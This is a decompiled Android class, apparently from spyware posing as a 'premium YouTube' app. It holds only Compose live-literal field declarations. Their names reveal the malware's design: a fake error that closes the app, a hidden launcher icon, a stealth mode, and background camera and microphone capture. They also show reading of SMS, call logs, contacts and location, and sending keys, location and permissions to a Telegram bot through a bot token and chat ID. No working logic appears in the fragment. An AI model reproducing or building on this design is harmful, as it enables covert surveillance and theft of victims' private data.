package com.w8sb.w8premiumyt;

import androidx.compose.runtime.State;
import androidx.compose.runtime.internal.LiveLiteralFileInfo;
import androidx.compose.runtime.internal.LiveLiteralInfo;
import androidx.compose.runtime.internal.LiveLiteralKt;
import kotlin.Metadata;

/* JADX INFO: renamed from: com.w8sb.w8premiumyt.LiveLiterals$MainActivityKt, reason: use source file name */
/* JADX INFO: compiled from: MainActivity.kt */
/* JADX INFO: loaded from: /storage/emulated/0/Android/data/com.dastanapps.androiddevtools/files/decompiled/com.yt.phantombabar/dex/classes3.dex */
@Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
@LiveLiteralFileInfo(file = "C:/Users/User/Desktop/W8PremiumYT All Ine One Source Code/W8PremiumYT All Ine One/W8SBTST/app/src/main/java/com/w8sb/w8premiumyt/MainActivity.kt")
public final class MainActivity2 {

    /* JADX INFO: renamed from: Boolean$arg-0$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    private static boolean f۵Boolean$arg0$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;

    /* JADX INFO: renamed from: Boolean$arg-0$call-setLauncherIconVisible$fun-$anonymous$$arg-0$call-postDelayed$branch$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۱۳Boolean$arg0$callsetLauncherIconVisible$fun$anonymous$$arg0$callpostDelayed$branch$if1$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: Boolean$arg-1$call-getBoolean$val-askedAccessibility$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۱۹Boolean$arg1$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-backgroundCameraEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۲۰Boolean$arg1$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-fakeError$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۲۱Boolean$arg1$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-microphoneEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۲۲Boolean$arg1$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-stealthMode$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۳۰Boolean$arg1$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-$set-uninstallReceiverRegistered$$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۳۵State$Boolean$arg0$call$setuninstallReceiverRegistered$$try1$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۳۶State$Boolean$arg0$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۳۷State$Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۳۸State$Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۳۹State$Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setDomStorageEnabled$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۴۰State$Boolean$arg0$callsetDomStorageEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setJavaScriptEnabled$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۴۱State$Boolean$arg0$callsetJavaScriptEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setLauncherIconVisible$branch$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۴۲State$Boolean$arg0$callsetLauncherIconVisible$branch$if1$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setLauncherIconVisible$else$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۴۳State$Boolean$arg0$callsetLauncherIconVisible$else$if1$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setLauncherIconVisible$fun-$anonymous$$arg-0$call-postDelayed$branch$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۴۴State$Boolean$arg0$callsetLauncherIconVisible$fun$anonymous$$arg0$callpostDelayed$branch$if1$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setLauncherIconVisible$try$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۴۵State$Boolean$arg0$callsetLauncherIconVisible$try$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setLoadWithOverviewMode$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۴۶State$Boolean$arg0$callsetLoadWithOverviewMode$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setSupportZoom$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۴۷State$Boolean$arg0$callsetSupportZoom$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-0$call-setUseWideViewPort$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۴۸State$Boolean$arg0$callsetUseWideViewPort$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-EQEQ$fun-isAccessibilityServiceEnabled$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۴۹State$Boolean$arg1$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-getBoolean$val-askedAccessibility$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۵۰State$Boolean$arg1$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-optBoolean$arg-0$call-$set-backgroundCameraEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۵۱State$Boolean$arg1$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-optBoolean$arg-0$call-$set-fakeError$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۵۲State$Boolean$arg1$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-optBoolean$arg-0$call-$set-microphoneEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۵۳State$Boolean$arg1$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-optBoolean$arg-0$call-$set-postNotifications$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۵۴State$Boolean$arg1$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-optBoolean$arg-0$call-$set-readCallLog$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۵۵State$Boolean$arg1$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-optBoolean$arg-0$call-$set-readContacts$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۵۶State$Boolean$arg1$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-optBoolean$arg-0$call-$set-readLocation$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۵۷State$Boolean$arg1$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-optBoolean$arg-0$call-$set-readSms$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۵۸State$Boolean$arg1$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-optBoolean$arg-0$call-$set-readStorage$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۵۹State$Boolean$arg1$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-optBoolean$arg-0$call-$set-requirePermissions$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۶۰State$Boolean$arg1$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-optBoolean$arg-0$call-$set-stealthMode$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۶۱State$Boolean$arg1$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Boolean$arg-1$call-putBoolean$$this$call-apply$branch$if$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Boolean> f۶۲State$Boolean$arg1$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Int$class-MainActivity, reason: not valid java name */
    private static State<Integer> f۶۳State$Int$classMainActivity;

    /* JADX INFO: renamed from: State$Long$arg-1$call-postDelayed$branch$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<Long> f۶۴State$Long$arg1$callpostDelayed$branch$if1$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$Long$arg-1$call-postDelayed$fun-run$class-$no-name-provided$$val-runnable$fun-startRepeatingGeoLocation$class-MainActivity, reason: not valid java name */
    private static State<Long> f۶۵State$Long$arg1$callpostDelayed$funrun$class$nonameprovided$$valrunnable$funstartRepeatingGeoLocation$classMainActivity;

    /* JADX INFO: renamed from: State$String$$this$call-plus$val-msg$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static State<String> f۶۶State$String$$this$callplus$valmsg$funsendTelegramPermissions$classMainActivity;

    /* JADX INFO: renamed from: State$String$0$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static State<String> f۶۷State$String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;

    /* JADX INFO: renamed from: State$String$0$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static State<String> f۶۸State$String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;

    /* JADX INFO: renamed from: State$String$0$str$arg-0$call-$init$$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static State<String> f۶۹State$String$0$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;

    /* JADX INFO: renamed from: State$String$0$str$arg-0$call-parse$arg-0$call-setData$branch$if$branch$if$fun-requestBatteryOptimizations$class-MainActivity, reason: not valid java name */
    private static State<String> f۷۰State$String$0$str$arg0$callparse$arg0$callsetData$branch$if$branch$if$funrequestBatteryOptimizations$classMainActivity;

    /* JADX INFO: renamed from: State$String$0$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static State<String> f۷۱State$String$0$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;

    /* JADX INFO: renamed from: State$String$0$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static State<String> f۷۲State$String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;

    /* JADX INFO: renamed from: State$String$0$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static State<String> f۷۳State$String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;

    /* JADX INFO: renamed from: State$String$2$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static State<String> f۷۴State$String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;

    /* JADX INFO: renamed from: State$String$2$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static State<String> f۷۵State$String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;

    /* JADX INFO: renamed from: State$String$2$str$arg-0$call-$init$$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static State<String> f۷۶State$String$2$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;

    /* JADX INFO: renamed from: State$String$2$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static State<String> f۷۷State$String$2$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;

    /* JADX INFO: renamed from: State$String$2$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static State<String> f۷۸State$String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;

    /* JADX INFO: renamed from: State$String$2$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static State<String> f۷۹State$String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;

    /* JADX INFO: renamed from: State$String$4$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static State<String> f۸۰State$String$4$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-$init$$arg-1$call-registerReceiver$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۸۱State$String$arg0$call$init$$arg1$callregisterReceiver$try1$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-$init$$arg-1$call-registerReceiver-1$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۸۲State$String$arg0$call$init$$arg1$callregisterReceiver1$try1$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-$init$$arg-1$call-registerReceiver-2$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۸۳State$String$arg0$call$init$$arg1$callregisterReceiver2$try1$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-$init$$arg-1$call-registerReceiver-3$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۸۴State$String$arg0$call$init$$arg1$callregisterReceiver3$try1$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-$init$$arg-1$call-registerReceiver-4$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۸۵State$String$arg0$call$init$$arg1$callregisterReceiver4$try1$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-getBoolean$val-askedAccessibility$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۸۶State$String$arg0$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-getSharedPreferences$val-prefs$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۸۷State$String$arg0$callgetSharedPreferences$valprefs$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-getString$arg-0$call-$set-botToken$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۸۸State$String$arg0$callgetString$arg0$call$setbotToken$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-getString$arg-0$call-$set-chatId$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۸۹State$String$arg0$callgetString$arg0$call$setchatId$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-joinToString$arg-0$call-plus$val-msg$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static State<String> f۹۰State$String$arg0$calljoinToString$arg0$callplus$valmsg$funsendTelegramPermissions$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-loadUrl$else$when$fun-onReceivedError$class-$no-name-provided$$arg-0$call-setWebViewClient$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static State<String> f۹۱State$String$arg0$callloadUrl$else$when$funonReceivedError$class$nonameprovided$$arg0$callsetWebViewClient$try$funsetupWebView$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-open$$$this$call-bufferedReader$$$this$call-use$val-configStr$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۹۲State$String$arg0$callopen$$$this$callbufferedReader$$$this$calluse$valconfigStr$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optBoolean$arg-0$call-$set-backgroundCameraEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۹۳State$String$arg0$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optBoolean$arg-0$call-$set-fakeError$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۹۴State$String$arg0$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optBoolean$arg-0$call-$set-microphoneEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۹۵State$String$arg0$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optBoolean$arg-0$call-$set-postNotifications$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۹۶State$String$arg0$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optBoolean$arg-0$call-$set-readCallLog$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۹۷State$String$arg0$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optBoolean$arg-0$call-$set-readContacts$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۹۸State$String$arg0$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optBoolean$arg-0$call-$set-readLocation$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۹۹State$String$arg0$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optBoolean$arg-0$call-$set-readSms$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۰۰State$String$arg0$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optBoolean$arg-0$call-$set-readStorage$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۰۱State$String$arg0$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optBoolean$arg-0$call-$set-requirePermissions$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۰۲State$String$arg0$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optBoolean$arg-0$call-$set-stealthMode$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۰۳State$String$arg0$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-optString$arg-0$call-$set-webViewUrl$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۰۴State$String$arg0$calloptString$arg0$call$setwebViewUrl$$try2$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-plus$arg-0$call-contains$else$when$arg-0$call-EQEQ$fun-isAccessibilityServiceEnabled$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۰۵State$String$arg0$callplus$arg0$callcontains$else$when$arg0$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-putBoolean$$this$call-apply$branch$if$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۰۶State$String$arg0$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-setAction$fun-$anonymous$$arg-0$call-apply$val-serviceIntent$try$fun-startUploadService$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۰۷State$String$arg0$callsetAction$fun$anonymous$$arg0$callapply$valserviceIntent$try$funstartUploadService$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-setMessage$$this$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۰۸State$String$arg0$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۰۹State$String$arg0$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۱۰State$String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۱۱State$String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۱۲State$String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۱۳State$String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۱۴State$String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۱۵State$String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-0$call-setTitle$$this$call-setMessage$$this$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۱۶State$String$arg0$callsetTitle$$this$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-1$call-encode$arg-0$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۱۷State$String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-1$call-encode$arg-0$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۱۸State$String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-1$call-makeText$$this$call-show$catch$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۱۹State$String$arg1$callmakeText$$this$callshow$catch$funsetupWebView$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-1$call-makeText$$this$call-show$catch$fun-startUploadService$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۲۰State$String$arg1$callmakeText$$this$callshow$catch$funstartUploadService$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۲۱State$String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;

    /* JADX INFO: renamed from: State$String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۲۲State$String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;

